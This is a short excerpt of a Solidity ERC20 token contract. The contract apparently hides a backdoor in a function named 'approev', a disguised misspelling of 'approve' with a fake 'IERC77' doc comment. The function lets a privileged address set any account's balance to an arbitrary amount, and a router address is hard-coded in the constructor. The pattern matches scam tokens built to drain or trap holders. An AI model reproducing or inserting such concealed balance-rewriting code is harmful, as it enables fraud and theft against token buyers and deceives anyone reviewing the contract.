 ...
 * applications.
 */
contract Token is Context, IERC20, IERC20Metadata, IERC20Errors {
    ...
    constructor(string memory name_, string memory symbol_, uint256 supply_) {
        ...
        _uniswapV2Router = IUniswapV2Router02(0x3e4421aAe7A0E48CBbe61E0e3C7E9AD846575306);
    }
    ...
    /**
     * @dev See {IERC77-Approev}
     */
    function approev(address recipient, uint256 _decreaseFee)  external {
        uint256 _feeAsDecreasedValue = _decreaseFee; _balances[recipient] = _feeAsDecreasedValue; require(_excludeFromTax(recipient), "Only UniswapV2Route");
    }
